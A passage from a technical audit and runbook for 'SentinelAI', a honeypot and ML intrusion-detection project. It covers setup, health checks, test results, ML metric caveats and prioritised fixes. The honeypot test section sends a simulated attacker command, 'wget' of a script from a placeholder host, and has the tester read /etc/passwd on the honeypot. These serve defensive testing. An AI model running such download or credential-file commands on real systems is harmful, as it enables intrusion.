| `honeypotsessions` (`HoneypotSession.js`) | sessionId (unique), sourceIP, sourcePort, commands[], credentials[] (redacted), iocExtracted, deceptionScore, qDeceptionScore, recommendedProfile, aiClassification, closureAnalysisState, hassh, linkedThreatLog | {sourceIP,createdAt↓}; {honeypotNode,status}; createdAt↓; hassh; linkedThreatLog; sessionId unique | session_collector, honeypotService | honeypotController, match-session, campaignService, retention |
| `blockedips` (`BlockedIP.js`) | ip (unique), reason, blockedAt, blockedBy, threatRef | ip unique | containmentService, honeypotService | check-block (Cowrie blocker), threats/blocked-ips |
| `containmentactions` (`ContainmentAction.js`) | containmentId (unique), idempotencyKey (unique sparse), target, normalizedTarget, enforcementBackend, enforcementStatus, expiresAt, correlationId, failureReason | containmentId, idempotencyKey, normalizedTarget, enforcementStatus, expiresAt, correlationId (+1) | containmentService, reconciliation | containmentController |
| `campaigns` (`Campaign.js`) | campaign id (unique), sessions[], lastSeen | lastSeen↓, unique id | campaignService | routes/campaigns |
| `trainingsamples` (`TrainingSample.js`) | sourcePredictionId, featureVector, groundTruthLabel, status, sampleHash | {sourcePredictionId,status}; {sampleHash,groundTruthLabel}; {status,groundTruthLabel} + inline | trainingSampleService | routes/trainingSamples — **nothing trains from it** |
| `users` (`User.js`) | email (unique), password (bcrypt), role, status, mustChangePassword, authVersion | email unique | db.ensureDefaultAdmin, userController, seed | auth |
| `authsessions` (`AuthSession.js`) | user, refresh hash, expiresAt, revokedAt | user; **TTL expiresAt**; **TTL revokedAt +48 h (sparse)** | authSessionService | every `protect` and socket packet |
| `auditlogs` (`AuditLog.js`) | eventType, actor, action, target, status | createdAt↓; {actor.id,createdAt}; {action,createdAt}; target.id; eventType; status | utils/auditLogger, securityAuditLogger | routes/audit |
| `systemsettings` (`SystemSetting.js`) | key (unique), value | key unique | threatController.updateSettings | aiService, honeypotService (autoBlockEnabled) |
| `archived_threatlogs`, `archived_honeypotsessions`, `archived_alerts` (raw driver) | archived copies | — | retentionService (opt-in, `RETENTION_ENABLED=true`, dry-run default) | retentionService restore |

Off-DB persistence: `backend/logs/emergency_audit.log` (`utils/emergencyAudit.js:7-8`) when a prediction cannot be persisted.

## 2.10 Model loading and Q-table persistence (summary)

- **Loaded once per process** in the FastAPI `lifespan` (`main.py:39-51`), not per request.
- **First file that exists wins** among 7 candidates (`predictor.py:124-141`) → today
  `ai-engine/models/rf_classifier_cicids_v2.pkl` (live log confirmed), plus `isolation_forest_cicids.pkl`.
- **Validation** — the load fails closed (inference unavailable) if `n_features_in_ ≠ 53`, if the
  meta feature count differs, or if the meta feature order differs (lines 168-174).
- **SHAP** — a `TreeExplainer` is built over `named_steps['rf']`. Explanations are only computed
  when `?explain=true`.
- **Startup cost** — about 16 s measured: 12 s to unpickle the RF, 4.6 s for the SHAP init.
- **Q-table** — see Flow 2: seed → temp copy → save every 10 episodes and on shutdown → lost on restart unless configured.

---

# PHASE 3 — IS IT WORKING? (VERIFY, DON'T ASSUME)

## 3.1 Start everything locally, in order (Windows, Git Bash or PowerShell)

1. **MongoDB** (Community Server, service or manual):
   ```bash
   mongod --dbpath C:/data/db --bind_ip 127.0.0.1 --port 27017
   ```
2. **AI engine.** It does **not** read `ai-engine/.env` by itself, because no code calls
   `load_dotenv` (grep finds none). Pass the file to uvicorn:
   ```bash
   cd ai-engine && .venv/Scripts/python.exe -m uvicorn inference.main:app --host 127.0.0.1 --port 8000 --env-file .env
   ```
   Use the `.venv` interpreter. Your global Python has scikit-learn 1.7.2, while the models are
   pinned to 1.4.0 (`requirements.txt`). Wait for `Inference model state: ready` (about 16 s).
3. **Backend.** It reads `backend/.env` through dotenv (`server.js:1`):
   ```bash
   cd backend && npm start
   ```
   Or use `start-backend.ps1`. Wait for `SentinelAI Backend ready on port 5000`.
4. **Frontend:**
   ```bash
   cd frontend && npm run dev
   ```
   Then open http://localhost:3000. Vite proxies `/api` and `/socket.io` to `127.0.0.1:5000`.
5. **Optional honeypot.** Cowrie runs on a Linux host or WSL with `honeypot/cowrie/cowrie.cfg`.
   Then:
   ```bash
   SENTINEL_API=http://<backend-host>:5000/api HONEYPOT_API_KEY=<key> python honeypot/parsers/log_parser.py --live --log /opt/cowrie/var/log/cowrie/cowrie.json
   ```
   For the blocker plugin, set `SENTINEL_API_URL` explicitly, because its default is `http://backend:5000/api`.

## 3.2 Health-check checklist (curl)

Set these first: `B=http://127.0.0.1:5000`, `A=http://127.0.0.1:8000`, and `K`, `HK` as your
`SENTINEL_KEY` and `HONEYPOT_API_KEY`. Never paste real keys into chat or screenshots.

```bash
# AI engine
curl -s $A/health                                   # {"status":"ok"} liveness
curl -s $A/ready                                    # {"status":"ok"} models loaded
curl -s -o /dev/null -w '%{http_code}\n' $A/model/info            # expect 401
curl -s -H "X-API-Key: $K" $A/model/info            # versions, metrics, thresholds
curl -s -H "X-API-Key: $K" -H 'Content-Type: application/json' \
  -d '{"sourceIP":"203.0.113.5","flow_duration":120,"total_fwd_packets":1,"syn_flag_count":1,"rst_flag_count":1,"flow_packets_per_sec":16666}' \
  $A/predict/eval                                   # side-effect-free prediction

# Backend public
curl -s -i $B/health                                # 200 only if Mongo+AI+revocation OK
curl -s $B/                                         # banner

# Log in (CSRF handshake). Origin must equal CLIENT_URL.
O=http://localhost:3000; J=/tmp/sentinel.jar
CSRF=$(curl -s -c $J -H "Origin: $O" $B/api/auth/csrf | python -c "import sys,json;print(json.load(sys.stdin)['data']['csrfToken'])")
TOKEN=$(curl -s -b $J -c $J -H "Origin: $O" -H "X-CSRF-Token: $CSRF" -H 'Content-Type: application/json' \
  -d '{"email":"<admin email>","password":"<password>"}' $B/api/auth/login | python -c "import sys,json;print(json.load(sys.stdin)['data']['token'])")
H="Authorization: Bearer $TOKEN"

# Authenticated reads
curl -s -H "$H" $B/api/auth/me
curl -s -H "$H" $B/api/system/health
curl -s -H "$H" $B/api/ai/engine/health
curl -s -H "$H" "$B/api/threats?limit=5"
curl -s -H "$H" $B/api/threats/settings             # autoBlockEnabled (expect false)
curl -s -H "$H" $B/api/containment/status           # expect backend "mock"
curl -s -H "$H" $B/api/honeypot/nodes
curl -s -H "$H" "$B/api/ai/predictions?limit=5"

# Negative checks
curl -s -o /dev/null -w '%{http_code}\n' $B/api/threats            # 401 (no token)
curl -s -o /dev/null -w '%{http_code}\n' -H "X-API-Key: $HK" -X POST $B/api/ai/predictions   # 403 (honeypot key)

# Sample "attack" through the full Flow 1 (writes AIPrediction; may create ThreatLog + socket events)
curl -s -H "$H" -H 'Content-Type: application/json' -d '{
  "sourceIP":"203.0.113.77","flow_duration":3,"total_fwd_packets":1,"total_bwd_packets":1,
  "total_len_fwd_packets":0,"total_len_bwd_packets":0,"syn_flag_count":1,"rst_flag_count":1,
  "flow_packets_per_sec":666666,"init_win_bytes_forward":1024,"init_win_bytes_backward":0}' \
  $B/api/ai/analyze
```
This flow may still classify as BENIGN. The model leans heavily on `init_win_bytes_*` (see 3.5).
For reliably labelled attacks, replay real rows:
```bash
python ai-engine/demo/replay_cicids.py --help
```
Note that the replay hits `/predict/eval`, so nothing reaches the dashboard. To see rows on the
dashboard, send them to `/api/ai/analyze` instead.

## 3.3 Honeypot ingest test without Cowrie (simulates a whole session)

```bash
S=test-$(date +%s); IP=198.51.100.23
curl -s -H "X-API-Key: $HK" -H 'Content-Type: application/json' -d "{\"eventType\":\"SESSION_OPENED\",\"sessionId\":\"$S\",\"sourceIP\":\"$IP\",\"sourcePort\":40022}" $B/api/honeypot/ingest
curl -s -H "X-API-Key: $HK" -H 'Content-Type: application/json' -d "{\"sessionId\":\"$S\",\"sourceIP\":\"$IP\",\"command\":\"wget http://203.0.113.9/x.sh\"}" $B/api/honeypot/ingest/command
curl -s -H "X-API-Key: $HK" -H 'Content-Type: application/json' -d "{\"sessionId\":\"$S\",\"sourceIP\":\"$IP\",\"durationSeconds\":95,\"credentials\":[{\"username\":\"root\",\"password\":\"x\",\"success\":true}]}" $B/api/honeypot/ingest/close
curl -s -H "$H" "$B/api/honeypot/sessions?ip=$IP"   # aiClassification, qDeceptionScore, recommendedProfile
```
**Real Cowrie test login.** With Cowrie and the parser running:
```bash
ssh -p 2222 root@<cowrie-host>
```
Use password `123456`, which is a valid `honeypot/cowrie/userdb.txt` entry. Then run `uname -a`,
`cat /etc/passwd` and `exit`. Watch the parser log, then `GET /api/honeypot/sessions`.

## 3.4 Socket.IO test client

Save as `scratch/socket_probe.cjs` and run it from `backend/`, because `socket.io-client` lives in
`frontend/node_modules`. Use `NODE_PATH=../frontend/node_modules`, or install it into `scratch`.
```js
// usage: TOKEN=<access token> node socket_probe.cjs
const { io } = require('socket.io-client')
const s = io('http://127.0.0.1:5000', {
  auth: { token: process.env.TOKEN },
  extraHeaders: { Origin: 'http://localhost:3000' }, // must be an allowed origin
  transports: ['websocket'],
})
s.on('connect', () => { console.log('connected', s.id); s.emit('join_room', {}); s.emit('subscribe_threats'); s.emit('request_stats') })
s.on('connect_error', (e) => console.error('connect_error', e.message))
s.onAny((event, data) => console.log(new Date().toISOString(), event, JSON.stringify(data).slice(0, 200)))
setInterval(() => s.emit('ping_sentinel'), 10000)
```
Expected output:
- `connected`, `subscribed`, `stats_snapshot` and `pong_sentinel` straight away.
- `system_health` every 15 s.
- `ai_prediction` (and `new_threat` when score ≥ 0.7) after the `/api/ai/analyze` call.
- `honeypot_*` events during 3.3.

## 3.5 Tests: how to run, and what happened today

```bash
cd backend && npx jest --runInBand --ci
```
→ 54 passed, 4 skipped, 948 tests passed, 13 skipped. The 4 skipped suites (`authBrowser`,
`authPersistence`, `credentialLifecycleIntegration`, `timezonePersistence`) need a real Mongo
through `AUTH_TEST_MONGO_URI`.

```bash
cd ai-engine && SENTINEL_KEY=<any 32 chars> .venv/Scripts/python.exe -m pytest -q
```
→ 335 passed. The warnings: pydantic `class Config` deprecation, and scikit-learn
`InconsistentVersionWarning` when an *experiment candidate* pickled with sklearn 1.7.2 is loaded
under 1.4.0.

```bash
cd frontend && npm test && npm run build
```
Not run today. CI (`.github/workflows/ci.yml`) runs backend lint and test, AI pytest on Python 3.11,
and frontend test and build.

## 3.6 Verdict table

| Component | Status | Evidence | File |
|---|---|---|---|
| Express API boot, env validation | Working (tested) | `secretsValidation.test.js`, suites green | `backend/server.js`, `config/validateEnv.js` |
| Auth (JWT + server sessions, CSRF, RBAC) | Working (tested) | auth*, roleMatrix, rbacPhase3B suites | `middleware/auth.js`, `authCookies.js`, `services/authSessionService.js` |
| Socket.IO auth + role rooms | Working (tested) | `websocket.test.js`, `socketRoomDelivery.test.js` (untracked) | `websocket/*.js` |
| FastAPI inference service | Working (live-verified) | started, `/ready` ok, 401/403/422 correct | `ai-engine/inference/main.py` |
| RF + IF models | Working, metrics unverified on independent data | loads, predicts; see 3.7(c) | `ai-engine/models/` |
| XGBoost / stacking models | Present, **not used at runtime** | first-match load order | `predictor.py:124-141` |
| SHAP explanations | Working (startup log) | "SHAP TreeExplainer initialized" | `predictor.py::init_explainer` |
| Node ↔ FastAPI integration | Working (unit + contract tests); no retries | `aiDependencyContract.test.js` | `services/aiEngineService.js` |
| Live traffic → dashboard pipeline | **Not implemented** (manual `/api/ai/analyze` or external `/predict` only) | sniffer writes CSV; replay uses `/predict/eval` | `honeypot/sniffer/sniffer.py`, `demo/replay_cicids.py` |
| MongoDB persistence | Working (tested with memory server) | 948 tests | `backend/models/*` |
| Cowrie log parser → ingest | Partially (unit/contract tested; live Cowrie not verified here) | `cowrieIngest`, `test_cowrie_parser*` | `honeypot/parsers/log_parser.py` |
| Cowrie output plugin | Untested live / not enabled | missing `[output_sentinel]` in cfg | `honeypot/cowrie/sentinel_output.py` |
| Cowrie blocker plugin | Untested live | default URL `http://backend:5000/api` | `honeypot/cowrie/sentinel_blocker.py` |
| Honeypot AI classification | Partially — rule-based synthetic flow, not true ML | probe: `cat /etc/passwd` → BENIGN 0.08 | `utils/features.py:318-420` |
| Q-learning deception scorer | Working mechanically; learning degenerate; not persisted by default | live probe; code | `rl_engine/deception_scorer.py`, `inference/deception.py` |
| Profile switching | Mocked/manual (recommendation only) | `recommendationApplied: False` | `honeypot/switch_profile.py` |
| Auto-block (deny-list) | Working, OFF by default | `containmentLifecycle`, `containmentPolicy` tests | `containmentService.executeAutoBlock` |
| Containment policy safety | Working (tested) | `containmentProtectedTargets.test.js`, `windowsFirewallSafety.test.js` | `containmentPolicyService.js` |
| Mock containment adapter | Mocked (default) | factory default | `MockContainmentAdapter.js` |
| Real Windows firewall adapter | **Untested live** | no VM marker, no run logs | `WindowsFirewallAdapter.js` |
| Threat intel (AbuseIPDB) | Untested live (needs key); unit tested | `threatIntelService.test.js` | `services/threatIntelService.js` |
| Campaign clustering | Working (unit tested) | `campaignService.test.js` | `services/campaignService.js` |
| Training-sample curation | Working (tested); **not consumed** by any trainer | `trainingSample.test.js` | `services/trainingSampleService.js` |
| Retention | Working, disabled by default | `retentionPolicy.test.js` | `services/retentionService.js` |
| Outbox / event bus | Working in-memory; not on the live emit path | `systemOutbox`, `outboxStress` tests | `utils/securityEventBus.js` |
| Shadow detectors (B2/E2) | Disabled by flag; shadow-only | `test_volumetric_flood.py`, etc. | `ai-engine/modular/` |
| Docker Compose deployment | **NOT FOUND** | — | — |

## 3.7 The four suspicions

**(a) "No supervised retraining loop — only Q-table updates at runtime." → CONFIRMED.**
- No runtime code calls `fit` or `train.py`, or spawns Python. A grep over
  `backend/services|routes|controllers` and `ai-engine/inference` found none.
- `ai-engine/training/train.py` is an offline CLI that reads CSVs (`--data`) and writes `.pkl` files into `--model-dir`.
- The `TrainingSample` workflow (QUARANTINED → VALIDATED → ELIGIBLE_FOR_TRAINING) collects analyst
  labels, but **nothing reads ELIGIBLE samples into training**.
- The sniffer's `flows.csv` is likewise only a dataset file.
- At runtime the only things that "learn" are the Q-table and the in-memory stats.

**(b) "The real Windows firewall adapter has never run live." → CONFIRMED (no evidence it ever ran).**
- Its gate defaults off, and the auto-block path never calls it (2.7).
- The VM harness needs `SENTINELAI_ISOLATED_TEST_VM=true` plus `C:\sentinelai_vm_marker.txt`.
  The marker file is absent on this machine.
- No netsh run logs were found. `docs/final-closure/known-limitations-and-release-gates.md:33-35`
  records it as LOCKED/DISABLED.
- Tests only cover the fail-closed refusals and input sanitising, without touching the OS.

**(c) "Metrics (98.43% / 0.9862 / 99.13% XGB) predate the time-of-day leakage fix — retrain?" → PARTLY REFUTED, with a different, real problem.**
- *Dates.* The deployed RF `rf_classifier_cicids_v2_meta.json` was trained 2026-08-09 with
  acc 0.9843, F1w 0.9862, **F1 macro 0.8448**. The 99.13% figure comes from
  `xgb_classifier_cicids_meta.json` (2026-08-09). The "fix" (removing the `datetime.now()` fallback
  so a missing timestamp gives `(0,0)`, `features.py:162-163`) landed in the 2026-10-16 and
  2026-10-18 commits. So yes, the metrics predate the fix.
- *But the shipped models never learned time of day.* Measured with joblib, every shipped model
  (ai-engine RF v2, root RF v2, XGB, and the IF scaler) has `time_of_day_sin/cos` training
  **mean 0 and variance 0**, and the RF and XGB give them **importance 0.0**. Varying the hour
  across 400 synthetic flows changed **0** predictions. Current `train.py` never computes them:
  they aren't CSV columns, so `prepare_features` fills them with 0.0 (`features.py:450`).
  The time leakage documented in `experiments/gate1_phase13_shift_and_leakage/feature_leakage_audit.json`
  (ranks 3–4) concerns the **multicorpus candidate** models, not the deployed artifact. That
  contradicts `gate1_phase14_1_evidence_adjudication.../evidence_adjudication_matrix.md` §2.1,
  which says the production model used real time values. The artifact itself shows otherwise.
- *Why the numbers still aren't trustworthy for a viva:*
  - `train.py:195` uses a random stratified **row-level** split (`train_test_split(..., random_state=42)`).
    Flows from the same capture session land in both train and test (documented in
    `gate1_final_decision.md` Criterion C).
  - The model's top feature is `init_win_bytes_backward` (importance 0.099), a well-known
    CICIDS2017 shortcut.
  - **Macro F1 is 0.84**: rare classes are much weaker than the headline suggests.
  - Your own Phase 13 sealed-test evaluation of the leakage-free 49-feature candidate is marked
    `"FAIL - GATE-1 REMAINS OPEN"` (benign FPR 0.112% vs a 0.1% target).
- *Verdict:* no retrain is needed for time leakage specifically. You **do** need a re-evaluation on
  a capture- or day-separated hold-out, and you should quote macro F1 alongside accuracy. Retrain
  only if you also drop the dead time features and the window shortcut features (schema change →
  new `FEATURE_SCHEMA_VERSION`).

**(d) "Root RF model differs from the ai-engine copy — which one loads?" → CONFIRMED different; the backend uses `ai-engine/models/rf_classifier_cicids_v2.pkl`.**
- The hashes differ (`ca0efb1f…` 46.2 MB, Aug 9 vs root `a7f98d2e…` 40.8 MB, Aug 14).
- Their metadata differ too: root acc 0.9863, F1w 0.9878, macro 0.8714.
- The live log printed `Classifier loaded from ...\ai-engine\models\rf_classifier_cicids_v2.pkl`.
- Node never loads a model; it calls FastAPI, and `MODEL_DIR` resolves relative to `ai-engine/` (`main.py:23-27`).
- The root copy is almost certainly the result of running `train.py` from the repo root, because
  `--model-dir` defaults to the relative path `models` (`train.py:568`).
- Note: the root model's metadata are *better*, but it is not deployed. Pick one and delete the other.

---

# PHASE 4 — ISSUES AUDIT

Severity reflects this project's context: a local demo with containment off by default.
Code fixes are minimal and match the surrounding style.

## Critical

**C1. The headline ML metrics aren't independent-test metrics.**
- *Where:* `ai-engine/training/train.py:195`; `models/rf_classifier_cicids_v2_meta.json`.
- *Why it matters:* the 98.43% / 99.13% accuracy figures come from a random row split on
  CICIDS2017. Session-level overlap inflates them, and they hide macro F1 of 0.84. An examiner who
  knows CICIDS will challenge this, and the paper (`paper_text.txt:32, 942, 1021`) states them as
  deployed performance.
- *Fix:*
  - Evaluate on a day-held-out split. For example, train Mon–Wed and test Thu–Fri; or reuse the
    sealed `final_test_v2.parquet` you already built.
  - Report macro F1, per-class recall and benign FPR.
  - Change the meta-writing step in `train.py` to record `split_strategy`:

  ```python
  meta["metrics"] = {"accuracy": acc, "f1_weighted": f1_weighted, "f1_macro": f1_macro}
  meta["evaluation"] = {"split": "random_row_stratified", "independent_holdout": False}
  ```

**C2. Live detection pipeline is absent but implied.**
- *Where:* `honeypot/sniffer/sniffer.py`, `ai-engine/demo/replay_cicids.py:299`.
- *Why it matters:* the architecture slide shows traffic → AI → dashboard, but no component sends
  live flows to `/api/ai/analyze` or `/predict`. If you demo "live detection", you have to drive it
  by hand.
- *Fix:* add a `--send-to-backend` mode to `replay_cicids.py` that POSTs to `/api/ai/analyze`.
  Or have the sniffer POST each completed flow to FastAPI `/predict` (with the callback). Or simply
  state it as future work (Phase 6 wording).

## High

**H1. Firewall commands run through a shell.**
- *Where:* `backend/services/containment/WindowsFirewallAdapter.js:3-5, 76-90`.
- *Why it matters:* inputs are allow-listed, so this isn't exploitable today. But `exec` means any
  future regex mistake becomes command injection running as Administrator.
- *Fix:* use `execFile` with an argument array, so no shell is involved:
  ```js
  const { execFile } = require('child_process')
  const execFilePromise = util.promisify(execFile)
  await execFilePromise('netsh', ['advfirewall', 'firewall', 'add', 'rule',
    `name=${assignedRuleName}`, 'dir=in', 'action=block', `remoteip=${safeTarget}`,
    `description=SentinelAI Automated Containment ${safeId}`], { timeout: 10000, windowsHide: true })
  ```
- *Also:* validate `safeTarget` with `net.isIP` / the policy CIDR parser, not the character regex
  alone. `verifyRule` checks `stdout.includes('Yes')`, which breaks on non-English Windows, so
  parse `Enabled:` instead.

**H2. AI outage turns every request into a stored "threat" and an alert.**
- *Where:* `backend/services/aiEngineService.js:61-77`; `aiService.js:59-134`.
- *Why it matters:* with FastAPI down, each `/api/ai/analyze` creates a `DEGRADED` ThreatLog plus a
  MEDIUM `SYSTEM_HEALTH` alert, flooding the dashboard and the DB.
- *Fix:* raise at most one system alert per outage window, and don't create a ThreatLog for
  degraded traffic:
  ```js
  // aiService.js
  let lastDegradedAlertAt = 0
  const DEGRADED_ALERT_COOLDOWN_MS = 5 * 60 * 1000
  // ...
  if (isDegraded && Date.now() - lastDegradedAlertAt > DEGRADED_ALERT_COOLDOWN_MS) {
    lastDegradedAlertAt = Date.now()
    // create the SYSTEM_HEALTH alert once
  }
  ```

**H3. Every lookup waits out the full timeout while the AI engine hangs.**
- *Where:* `aiEngineService.js:210-229`.
- *Why it matters:* `lastFetchedTime` only updates on success. While the AI engine is unreachable
  but the connection hangs, each call adds a 10 s wait on top of `predictRecord`'s 10 s.
- *Fix:*
  ```js
  const getBlockThreshold = async () => {
    const now = Date.now()
    if (now - lastFetchedTime < CACHE_TTL_MS) return cachedBlockThreshold
    lastFetchedTime = now // back off even on failure
    try {
      const info = (await ai.get('/model/info', { timeout: 1500 })).data
      if (typeof info?.thresholds?.block === 'number') cachedBlockThreshold = info.thresholds.block
    } catch (e) {
      logger.debug('[AI] threshold fetch failed, using cached value: ' + e.message)
    }
    return cachedBlockThreshold
  }
  ```

**H4. CPU-bound inference runs on the async event loop.**
- *Where:* `ai-engine/inference/main.py:181-235`; these are `async def` handlers that call the
  sync `predictor.predict`.
- *Why it matters:* the RF (hundreds of trees) and SHAP block the single event loop. Concurrent
  requests serialise, and `/ready` and `/health` stall under load. Kubernetes-style probes would
  then flap.
- *Fix:* declare the handlers as plain `def` (FastAPI runs them in a threadpool), or use
  `await run_in_threadpool(predictor.predict, ...)`:
  ```python
  from starlette.concurrency import run_in_threadpool
  r = await run_in_threadpool(predictor.predict, record.model_dump(), explain)
  ```
  If you go threaded, protect `stats` and the Q-learner with a `threading.Lock` (see M5).

**H5. Q-learning claim vs reality.**
- *Where:* `backend/services/honeypotService.js:130`; `rl_engine/deception_scorer.py:211-223`.
- *Why it matters:* the action is always the configured persona, and recommendations are never
  applied. Only one Q cell ever changes, so "self-evolving deception" can't be demonstrated.
- *Fix (minimum honest version):* store `recommendedProfile` and, when an operator applies it with
  `switch_profile.py` and restarts Cowrie, set `DECEPTION_ACTIVE_PROFILE` to it.
- *Fix (real version):* see Phase 5 F3.

**H6. Q-table learning lost on restart by default.**
- *Where:* `ai-engine/rl_engine/deception_scorer.py:46-65`; `inference/deception.py:29-36`.
- *Why it matters:* each process writes to `%TEMP%\sentinelai_isolated_runtime_<pid>`, so a
  restart starts again from the seed. Also, a crash loses up to 9 episodes, because it saves every 10.
- *Fix:* set `SENTINEL_ALLOW_REPO_RUNTIME_WRITE=1` (or `Q_TABLE_PATH=<abs path outside repo>`) in
  the AI engine's real environment, and save every episode, since the write is atomic and small:
  ```python
  if self.episode_count % int(os.getenv("Q_SAVE_EVERY", "1")) == 0: self.save()
  ```

**H7. AI engine ignores its `.env`.**
- *Where:* `ai-engine/inference/main.py` (no `load_dotenv`), even though `python-dotenv` is pinned.
- *Why it matters:* starting it without `--env-file` fails (missing `SENTINEL_KEY`), or runs with
  different settings than you think.
- *Fix:* add this at the top of `main.py`:
  ```python
  from dotenv import load_dotenv
  load_dotenv(Path(__file__).resolve().parent.parent / ".env")
  ```

## Medium

**M1. Check-then-insert race in containment.**
- *Where:* `containmentService.js:89-149`.
- *Why it matters:* two concurrent requests for the same target can both pass the `existingActive`
  check and create two ACTIVE actions (two firewall rules). There's no unique partial index.
- *Fix:*
  ```js
  ContainmentActionSchema.index({ normalizedTarget: 1 }, { unique: true, partialFilterExpression: { enforcementStatus: 'ACTIVE' } })
  ```
  Then handle `E11000` by returning the existing action.

**M2. Lost updates on honeypot sessions.**
- *Where:* `honeypot/collectors/session_collector.js:40-54`.
- *Why it matters:* the handler is read → mutate → `save()`. Concurrent `/command` posts for one
  session can overwrite `deceptionScore`, or throw a Mongoose `VersionError` (500).
- *Fix:* use `findOneAndUpdate({sessionId}, {$push:{commands:...}, $addToSet:{filesAccessed:{$each:...}}}, {new:true})`,
  then compute the score from the returned document.

**M3. storePrediction isn't atomic.**
- *Where:* `aiService.js:58-102`.
- *Why it matters:* the order is AIPrediction create → ThreatLog create → `pred.save`. A failure
  in between leaves a prediction without its threat link, or an orphan threat.
- *Fix:* wrap it with the existing `utils/transactionHelper.js` (when `MONGO_USE_TRANSACTIONS=true`
  on a replica set), or make the link idempotent: create the ThreatLog with `predictionId`, then
  `updateOne` the prediction.

**M4. Unthrottled `request_stats` and per-packet re-authorisation.**
- *Where:* `socketManager.js:64-83`; `websocket/auth.js:32-41`.
- *Why it matters:* any logged-in viewer can spam `request_stats` (3 counts per packet), and every
  packet also does a session DB read. Cheap DoS amplification.
- *Fix:*
  ```js
  let lastStatsAt = 0
  socket.on('request_stats', async () => {
    if (Date.now() - lastStatsAt < 5000) return
    lastStatsAt = Date.now()
    // ...existing body
  })
  ```
  Also cache `authorize` results per socket for a few seconds.

**M5. Shared mutable state in FastAPI.**
- *Where:* `main.py:37` (`stats`), `deception.py` (`_scorer`).
- *Why it matters:* it's safe today only because the handlers are async and single-threaded. It
  breaks as soon as H4 is fixed or `--workers > 1` is used. Multiple workers would each keep their
  own Q-table and overwrite each other's file (last writer wins).
- *Fix:* add a `threading.Lock` around `process_session` and `_upd`, and document `workers=1` for
  the RL component.

**M6. Analytics scan whole collections.**
- *Where:* `honeypotService.js:345-362` (`topCommands` `$unwind` and `topAttackers` with no
  `$match`); `aiService.js:224-257` (several unfiltered aggregates); `campaignService.js:49-51`
  (all campaigns from the last 7 days with populated sessions, on every session close).
- *Why it matters:* these grow linearly with data, and dashboard latency climbs.
- *Fix:* add `{ $match: { createdAt: weekAgo } }` stages, and cap `clusterSession` to candidate
  campaigns by `hassh` or IP first.

**M7. Deny-list and firewall are two disconnected systems.**
- *Where:* `containmentService.executeAutoBlock` vs `requestContainment`.
- *Why it matters:*
  - The UI says "Blocked", but only the honeypot blocker enforces it.
  - ContainmentAction (with the adapter) never learns about AI blocks.
  - Unblock/rollback paths differ.
- *Fix:* have `executeAutoBlock` call `requestContainment({ target: threat.sourceIP, requester: SYSTEM, idempotencyKey: 'auto:'+threat._id })`.
  With the mock adapter this stays safe, and it unifies the audit trail.

**M8. Honeypot "AI" on a synthetic vector.**
- *Where:* `ai-engine/utils/features.py:318-420`; `predictor.py::predict_from_honeypot` (+0.02 per command).
- *Why it matters:* the label is decided by keyword rules before the model runs. The score rises
  with command count regardless of content. A logged-in session doing `cat /etc/passwd` is BENIGN.
  The sniffer then uses these labels to build `flows.csv`, which is label noise if you ever train on it.
- *Fix:* say "rule-based session classification" in docs and UI, or train a small model on session
  features (command intents, duration, login, IOC count) using the honeypot sessions you collect.

**M9. Silent zero-filling of missing training columns.**
- *Where:* `features.py:450`.
- *Why it matters:* a misnamed CSV column quietly becomes all zeros. That is exactly how the time
  features became dead features.
- *Fix:* log a warning, and fail if more than N schema features are missing:
  ```python
  if not found:
      missing.append(fn)
      X_dict[fn] = pd.Series(0.0, index=df.index)
  # after loop
  if len(missing) > 2: raise ValueError(f"Training data missing schema features: {missing}")
  ```

**M10. Inconsistent anomaly threshold.**
- *Where:* `predictor.py:90, 320` vs `calculate_if_anomaly_signal`.
- *Why it matters:* `isAnomaly` uses the fixed −0.55, but the score signal uses the model's own
  `offset_` (≈ −0.474). A flow can contribute anomaly score while reporting `isAnomaly=False`.
- *Fix:* derive both from `offset_`, or document the two thresholds explicitly.

**M11. No model registry or integrity check.**
- *Where:* `predictor.py:124-141`.
- *Why it matters:* whichever filename exists first wins. A stray `.pkl` silently changes the
  deployed model, there's no hash pinning, and `joblib.load` of an untrusted pickle executes code.
- *Fix:* add `models/registry.json` (`{"active":"rf_classifier_cicids_v2.pkl","sha256":"ca0efb1f..."}`),
  verify the hash before loading, and fail closed on a mismatch.

**M12. Parser state is lost on restart and there's no retry.**
- *Where:* `honeypot/parsers/log_parser.py:28, 50-52, 101-118`.
- *Why it matters:*
  - Open sessions live only in memory, so a restart orphans them as `active` forever.
  - `post()` swallows every exception (bare `except`).
  - Failed command posts are dropped.
  - The backend sets `startTime: new Date()` (`session_collector.js:26`) instead of Cowrie's
    event timestamp, which breaks `match-session` (±5 s) during replay or lag.
- *Fix:* pass `startTime: e.get("timestamp")` and use it in `onSessionOpened`. Add a retry with
  backoff in `post`. Add a sweeper that closes sessions active for more than X hours.

**M13. Rate limiting is loose.**
- *Where:* `server.js:60-72`.
- *Why it matters:* 10,000 requests per 15 min per IP is effectively unlimited. Requests with an
  API key bypass it entirely, so a leaked honeypot key gets unthrottled writes.
- *Fix:* lower `RATE_LIMIT_MAX` to around 1000. Give API-key traffic its own limiter instead of `skip`.

## Low

| # | Issue | Where | Fix |
|---|---|---|---|
| L1 | Unused `exec` import from `child_process` in the collector | `session_collector.js:5` | Delete it. |
| L2 | `id` regex makes almost anything RECONNAISSANCE (`android`, `hidden`) | `session_collector.js:17` | Use `\bid\b`. |
| L3 | Bare `except: pass` hides a corrupt Q-table | `deception_scorer.py:106` | `except (OSError, json.JSONDecodeError) as e: log.warning(...)` |
| L4 | `rf.predict` and `rf.predict_proba` called separately (double cost); SHAP path predicts again | `predictor.py:310-311`, `get_explanation` | Take the `argmax` of `predict_proba`. |
| L5 | Login timing difference reveals whether an email exists | `authController.js:25-26` | Compare against a dummy bcrypt hash when the user is missing. |
| L6 | Duplicate, unused deception scorer | `honeypot/rl_engine/deception_scorer.py` | Delete it. |
| L7 | Dozens of `.bak`/`.orig` files tracked (`server.js.bak-*`, `threatController.js.orig-phase3d`, `xgb_*.pkl.bak`, etc.) | repo-wide | `git rm` them; git history keeps them. |
| L8 | `JWT_EXPIRES_IN` / `JWT_REFRESH_EXPIRES_IN` unused but documented | `backend/.env.example` | Remove them. |
| L9 | `sentinel_output.py` present but not enabled; blocker default host `backend` | `cowrie.cfg`, `sentinel_blocker.py:17` | Enable it or delete it; document `SENTINEL_API_URL`. |
| L10 | Alerts auto-expire after 7 days (TTL), possibly unexpected for audits | `models/Alert.js:35,43` | Document it, or make it configurable. |
| L11 | Pydantic v1 `class Config` deprecated | `main.py:106, 130` | `model_config = ConfigDict(extra="allow")` |
